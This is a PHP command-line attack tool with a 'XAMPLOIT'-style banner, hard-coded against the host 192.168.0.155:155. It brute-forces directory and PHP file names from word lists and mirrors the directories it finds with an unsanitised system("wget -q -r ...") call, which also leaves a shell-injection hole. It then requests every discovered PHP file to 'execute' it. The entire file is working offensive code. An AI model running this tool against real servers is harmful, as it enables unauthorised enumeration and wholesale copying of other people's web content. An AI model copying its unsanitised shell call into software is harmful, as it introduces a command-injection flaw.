<?php

function banner(){
    @system("clear");
    include 'config.php';
    print "\n";
    print "$cyan      ▄  ██   █▀▄▀█$red █ ▄▄  █    ████▄ ▄█    ▄▄▄▄▀ \n";
    print "$cyan  ▀▄   █ █ █  █ █ █$red █   █ █    █   █ ██ ▀▀▀ █    \n";
    print "$cyan    █ ▀  █▄▄█ █ ▄ █$red █▀▀▀  █    █   █ ██     █    \n";
    print "$cyan   ▄ █   █  █ █   █$red █     ███▄ ▀████ ▐█    █     \n";
    print "$cyan  █   ▀▄    █    █ $red  █        ▀       ▐   ▀      \n";
    print "$cyan   ▀       █    ▀  $red   ▀                          \n";
    print "$cyan          ▀        $white                            \n";
    print "\n";
}

function dirscan(){
    include 'config.php';
    $target = '192.168.0.155:155';
    $list = 'dirlist.txt';
    if(!preg_match("/^http:\/\//",$target) AND !preg_match("/^https:\/\//",$target)){
            $targetnya = "http://$target";
        }
    else{
            $targetnya = $target;
        }
    $a = fopen("$list","r");
    $b = filesize("$list");
    $c = fread($a,$b);
    $lists = explode("\n",$c);
    print "\n$cyan [$yellow *$cyan ]$white Directory Brute ...\n";
    foreach($lists as $dir){
        $log = "$targetnya/$dir";
        $ch = curl_init("$log");
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_exec($ch);
        $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if($httpcode == 200){
            $handle = fopen("dir.txt", "a+");
            fwrite($handle, "$log\n");
            print "\n$cyan [$okegreen OK$cyan ]$red >$white $log";
        }
        else{
            print "\n$cyan [$red ERROR$cyan ]$red >$white $log";
        }
    }
}

function phpscan(){
    include 'config.php';
    $target = '192.168.0.155:155';
    $list = 'phplist.txt';
    if(!preg_match("/^http:\/\//",$target) AND !preg_match("/^https:\/\//",$target)){
            $targetnya = "http://$target";
        }
    else{
            $targetnya = $target;
        }
    $a = fopen("$list","r");
    $b = filesize("$list");
    $c = fread($a,$b);
    $lists = explode("\n",$c);
    print "\n$cyan [$yellow *$cyan ]$white PHP file Scanning ...\n";
    foreach($lists as $dir){
        $log = "$targetnya/$dir";
        $ch = curl_init("$log");
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_exec($ch);
        $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        if($httpcode == 200){
            $handle = fopen("php.txt", "a+");
            fwrite($handle, "$log\n");
            print "\n$cyan [$okegreen OK$cyan ]$red >$white $log";
        }
        else{
            print "\n$cyan [$red ERROR$cyan ]$red >$white $log";
        }
    }
}

function dldir(){
    include 'config.php';
    $target = '192.168.0.155:155';
    $list = 'dir.txt';
    if(!preg_match("/^http:\/\//",$target) AND !preg_match("/^https:\/\//",$target)){
        $targetnya = "http://$target";
    }
    else{
        $targetnya = $target;
    }
    $a = fopen("$list","r");
    $b = filesize("$list");
    $c = fread($a,$b);
    $lists = explode("\n",$c);
    print "\n$cyan [$yellow *$cyan ]$white Cloning all Directory ...\n";
    foreach($lists as $dir){
        print "\n$cyan [$okegreen Cloning$cyan ]$red >$white $targetnya/$dir";
        @system("wget -q -r $targetnya/$dir");
    }
}

function exphp(){
    $target = '192.168.0.155:155';
    $list = 'php.txt';
    if(!preg_match("/^http:\/\//",$target) AND !preg_match("/^https:\/\//",$target)){
        $targetnya = "http://$target";
    }
    else{
        $targetnya = $target;
    }
    $a = fopen("$list","r");
    $b = filesize("$list");
    $c = fread($a,$b);
    $lists = explode("\n",$c);
    print "\n$cyan [$yellow *$cyan ]$white Execute PHP file ...\n";
    foreach($lists as $php){
        $ch = curl_init();
	    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_URL,$targetnya.'/'.$php);
        $result=curl_exec($ch)."\n";
        curl_close($ch);
        print $result;
    }
}

function result(){
    include 'config.php';
    print "\n$cyan [$okegreen *$cyan ]$white Directory list reported to dir.txt\n";
    print "\n$cyan [$okegreen *$cyan ]$white PHP file list reported to php.txt\n";
    print "\n$cyan [$okegreen *$cyan ]$white Directory clone reported to 192.168.0.155:155\n\n";
}

banner();
dirscan();
phpscan();
dldir();
exphp();
result();

?>